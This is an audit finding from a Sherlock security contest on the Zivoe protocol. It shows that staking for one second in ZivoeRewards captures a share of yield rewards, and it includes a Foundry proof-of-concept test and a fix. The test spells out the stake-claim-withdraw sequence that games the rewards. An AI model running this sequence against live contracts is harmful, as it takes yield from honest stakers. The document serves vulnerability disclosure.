Sour Black Orca

medium

# Have A Slice Of The Yield For Just Staking For 1 Second

## Summary

Yield generated by Locker modules is distributed as rewards , these rewards are meant for stakers . Any user can stake for just one second and enjoy a slice of these yield rewards . This is not fair for other stakers since someone can take some rewards (reducing the total rewards in pool) with a quick stake.

## Vulnerability Detail

Let's see through a PoC how with just staking for 1 second we enjoy yield rewards (Paste this PoC in the Test_ZivoeRewards.sol and change L26 to `assert(god.try_push(address(DAO), address(ZVEClaimer), address(ZVE), 10000 ether, ""));`)->

```solidity
function test_PoC3() public {

        uint256 deposit = 100 ether + 100 ether; // Minimum 100 DAI deposit.
        ZVEClaimer.forward(address(ZVE), 5000 ether, address(sue));

        
        assert(sue.try_approveToken(address(ZVE), address(stZVE), IERC20(address(ZVE)).balanceOf(address(sue))));
        assert(sam.try_approveToken(address(ZVE), address(stZVE), IERC20(address(ZVE)).balanceOf(address(sam))));

        sam.try_stake(address(stZVE), 10000 ether);
        sue.try_stake(address(stZVE), 1 ether);

        depositReward_DAI(address(stZVE), deposit);

        

        hevm.warp(block.timestamp + 1 seconds);

        sue.try_getRewards(address(stZVE));
        //sam.try_getRewards(address(stZVE));
        
        sue.try_withdraw(address(stZVE), stZVE.balanceOf(address(sue)));
        

    }
```    
Here Sue just stakes for one second and got 7.716e13 as rewards and then immediately withdraws to get her 1 ether back , 

Sam is an honest user who staked a large amount i.e. 10000 ether , if you uncomment the line `sam.try_getRewards(address(stZVE));` and run the test again you will see sam also receives the same rewards (while making a way bigger stake) , this proves sue has unfairly gained the reward from the yield.


## Impact

An attacker can just stake for 1 second and enjoy rewards , this can be done again and again to keep getting a slice of the total rewards and reduce the total pool for honest stakers.

## Code Snippet

https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-foundry/src/ZivoeRewards.sol#L253

https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-foundry/src/ZivoeRewards.sol#L281

## Tool used

Manual Review , Foundry

## Recommendation

Have a minimum staking period before which a staker cannot get rewards.